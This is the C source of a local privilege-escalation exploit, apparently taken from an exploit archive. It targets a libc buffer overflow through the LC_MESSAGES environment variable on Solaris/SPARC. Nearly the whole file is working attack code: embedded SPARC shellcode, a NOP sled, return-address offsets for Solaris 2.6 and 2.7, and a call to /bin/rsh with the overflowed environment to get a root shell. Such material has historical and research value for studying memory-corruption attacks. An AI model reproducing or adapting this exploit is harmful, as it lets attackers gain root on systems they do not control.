/*
source: https://www.securityfocus.com/bid/268/info

A buffer overflow in libc's handling of the LC_MESSAGES environment variable allows a malicious user to exploit any suid root program linked agains libc to obtain root privileges. This problem is found in both IBM's AIX and Sun Microsystem's Solaris. This vulnerability allows local users to gain root privileges.
*/

/*============================================================
   ex_lobc.c Overflow Exploits( for Sparc Edition)
   The Shadow Penguin Security
   (http://base.oc.to:/skyscraper/byte/551)
   Written by UNYUN (unewn4th@usa.net)


   offsets for 2.7/SPARC: 7144, 7152, 7160, 7168, and more...
   offset for 2.6/SPARC: 5392

  ============================================================
*/
#define EV          "LC_MESSAGES="
#define ADJUST      0
#define STARTADR    400
#define NOP         0xa61cc013
#define RETS        600

char    x[80000];

char exploit_code[] =
"\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e"
"\x2b\x0b\xda\xdc\xae\x15\x63\x68"
"\x90\x0b\x80\x0e\x92\x03\xa0\x0c"
"\x94\x10\x20\x10\x94\x22\xa0\x10"
"\x9c\x03\xa0\x14"
"\xec\x3b\xbf\xec\xc0\x23\xbf\xf4\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc"
"\x82\x10\x20\x3b\x91\xd0\x20\x08\x90\x1b\xc0\x0f\x82\x10\x20\x01"
"\x91\xd0\x20\x08"
;

unsigned long get_sp(void)
{
__asm__("mov %sp,%i0 \n");
}

int i;
unsigned int ret_adr;

main(int argc, char *argv[])
{
    int OFFSET;

    putenv("LANG=");
    memset(x,'x',70000);


    if (argc == 2)
      OFFSET = atoi(argv[1]);
        else
             OFFSET = 5392;     // default offset for 2.6

    for (i = 0; i < ADJUST; i++) x[i]=0x40;
    for (i = ADJUST; i < 1000; i+=4){
        x[i+3]=NOP & 0xff;
        x[i+2]=(NOP >> 8 ) &0xff;
        x[i+1]=(NOP >> 16 ) &0xff;
        x[i+0]=(NOP >> 24 ) &0xff;
    }
    for (i=0;i<strlen(exploit_code);i++) \
                x[STARTADR+i+ADJUST]=exploit_code[i];
    ret_adr=get_sp()-OFFSET;
    printf("jumping address : %lx,  offset = %d\n",ret_adr, OFFSET);
    if ((ret_adr & 0xff) ==0 ){
        ret_adr -=16;
        printf("New jumping address : %lx\n",ret_adr);
    }
    for (i = ADJUST+RETS; i < RETS+600; i+=4){
        x[i+3]=ret_adr & 0xff;
        x[i+2]=(ret_adr >> 8 ) &0xff;
        x[i+1]=(ret_adr >> 16 ) &0xff;
        x[i+0]=(ret_adr >> 24 ) &0xff;
    }
    memcpy(x,EV,strlen(EV));
    x[3000]=0;
    putenv(x);
    execl("/bin/rsh","su",(char *)0);
}